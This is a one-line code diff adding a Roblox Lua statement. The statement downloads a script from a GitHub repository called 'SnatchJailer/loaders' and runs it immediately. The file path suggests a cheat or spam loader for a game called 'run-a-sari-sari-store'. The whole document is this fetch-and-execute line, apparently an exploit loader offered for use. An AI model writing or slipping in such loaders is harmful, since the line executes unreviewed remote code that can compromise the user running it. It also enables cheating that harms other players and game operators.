@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/run-a-sari-sari-store-spam0-6f5dwghtibu2s7.lua"))()
